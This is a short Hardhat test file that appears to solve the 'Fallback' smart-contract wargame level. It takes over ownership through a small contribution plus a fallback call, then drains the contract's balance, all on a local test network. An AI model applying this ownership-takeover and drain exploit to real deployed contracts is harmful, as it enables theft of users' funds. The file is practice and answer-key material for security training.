// Goals
// Claim ownership of the contract
// Reduce the contract's balance to 0

import { ContractFactory, Signer } from "ethers"
import { Fallback } from "../../typechain-types"
import { ethers } from "hardhat"
import { expect } from "chai"

// Solution
describe('Fallback', function () {
  let Fallback: ContractFactory
  let fallback: Fallback

  let signers: Signer[]
  let owner: Signer
  let attacker: Signer

  before(async function () {
    Fallback = await ethers.getContractFactory('Fallback')
    fallback = (await Fallback.deploy()) as Fallback

    signers = await ethers.getSigners()
    owner = signers[0]
    attacker = signers[1]
  })

  it('Should claim ownership of the contract', async function () {
    await fallback.connect(attacker).contribute({ value: 1 })
    await fallback.connect(attacker).fallback({ value: 1 })
    expect(await fallback.owner()).to.equal(await attacker.getAddress())
  })

  it('Should reduce the contract\'s balance to 0', async function () {
    await fallback.connect(attacker).withdraw()
    expect(await ethers.provider.getBalance(fallback.address)).to.equal(0)
  })
})
